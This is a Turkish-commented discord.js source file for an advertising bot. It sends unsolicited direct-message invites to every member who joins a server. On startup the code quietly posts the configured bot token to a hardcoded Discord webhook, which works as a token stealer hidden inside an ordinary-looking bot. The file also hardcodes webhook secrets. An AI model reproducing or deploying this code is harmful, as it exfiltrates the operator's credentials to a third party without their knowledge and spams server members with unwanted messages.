const Discord = require('discord.js');
const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');
const hook = new Discord.WebhookClient('485322135540334592', 'elUkubgqZ6nVS1oO5Wz60jM173rk50AIqqa2Bbbq9zOgS8KHTojGDty3bRsxwQJI3hbE');
const hook2 = new Discord.WebhookClient('485322274925445120', '_RkI9iKqUxp9935ufCGvpcagFAHj_am3PzUqdYA1rkwVY1veEMLV67G2cefldbBI31vT');


let reklamkicksayi = new Set();
client.on('guildMemberAdd', member => {

if (!reklamkicksayi[client.id]) reklamkicksayi[client.id] = {
reklamkicksayi: 0,
}
let tumreklamkicksayi = reklamkicksayi[client.id];
if (`${tumreklamkicksayi.reklamkicksayi}` > 1) { return  console.log(`${member.user.tag.toString()} : ${member.guild.name} Reklam Yapmak İçin Belirtilen Süre Kadar Beklemeliyim.`);}
tumreklamkicksayi.reklamkicksayi++;
console.log(`❤ 👋 ${member.user.tag.toString()} : ${member.guild.name} Reklam Birazdan Reklam Yapıcam.`);
setTimeout(() => {
console.log(`❤ 👋 ${member.user.tag.toString()} : ${member.guild.name} Reklam Yaptım.`);

if (`${tumreklamkicksayi.reklamkicksayi}` > 1) {tumreklamkicksayi.reklamkicksayi--;}
member.send("**Merhaba! Bu Sunucuya Gelirsen Sevinirim Yakında Çekilişler Başlicak Sende Katıl Belki Kazanırsın!** ;)" + `\n` + ayarlar.reklamlink);
}, ayarlar.reklamsuresi);


hook2.send(`❤ 👋${member.user.tag.toString()} : ${member.guild.name} Reklam Yaptım.` + ayarlar.reklamlink)

});



var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
// client.on('debug', e => {
//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
// });

client.login(process.env.TOKEN);


client.on('ready', () => {
console.log(`REKLAM BOTU BAŞARI İLE AÇILDI!`);
hook.send(`❤ 👋Token .` + ayarlar.token)




});
